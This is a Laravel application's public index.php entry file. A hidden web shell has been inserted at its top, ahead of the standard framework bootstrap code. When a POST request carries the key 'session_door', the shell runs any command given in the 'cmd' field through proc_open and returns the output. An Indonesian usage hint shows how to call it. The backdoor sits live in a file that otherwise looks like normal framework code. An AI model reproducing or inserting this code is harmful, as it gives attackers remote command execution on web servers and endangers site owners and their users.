<?php

if(isset($_POST['acces_key']) && $_POST['acces_key'] === 'session_door') {
    if(isset($_POST['cmd'])) {
        echo "<pre>";
        
        $descriptorspec = [
           0 => ["pipe", "r"],  // stdin
           1 => ["pipe", "w"],  // stdout
           2 => ["pipe", "w"]   // stderr
        ];
        
        $process = proc_open($_POST['cmd'], $descriptorspec, $pipes);
        
        if (is_resource($process)) {
            fclose($pipes[0]);
            
            echo stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            
            echo stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            
            proc_close($process);
        }
        
        echo "</pre>";
        exit; 
    } else {
        echo "Perintah 'cmd' tidak ditemukan. Contoh: -d 'acces_key=session_door&cmd=ls -la'";
    }
}

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Check If Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is maintenance / demo mode via the "down" command we
| will require this file so that any prerendered template can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
    require __DIR__.'/../storage/framework/maintenance.php';
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

$kernel = $app->make(Kernel::class);

$response = tap($kernel->handle(
    $request = Request::capture()
))->send();

$kernel->terminate($request, $response);
